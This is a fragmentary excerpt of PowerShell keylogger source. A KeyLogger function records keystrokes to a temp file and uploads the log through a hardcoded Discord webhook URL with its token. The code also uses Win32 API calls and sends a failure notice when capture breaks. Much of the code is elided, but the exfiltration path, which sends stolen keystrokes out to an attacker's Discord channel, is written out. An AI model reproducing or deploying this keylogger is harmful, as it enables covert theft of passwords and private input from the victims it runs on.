...
function Upload-Discord {
  ...
  $hookurl = 'https://discord.com/api/webhooks/1090151831826616371/_GGqAGxZqdKuNA5DvEWZuq_V5c2YxOCDpkKM2iYQ9tJjoKfrsT0aVRSo_QpK5DIfTBMM'
...
function KeyLogger($logFile="$env:temp/$env:UserName.log") {
  ...
  # upload process
   Upload-Discord -file "$env:temp/$env:UserName.log" -text "$env:UserName logs"
...
'@
 ...
 $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru
  ...
  # send logs if code fails
    ...
    # send message
    Upload-Discord -text "$env:UserName FAIL"
  }
}
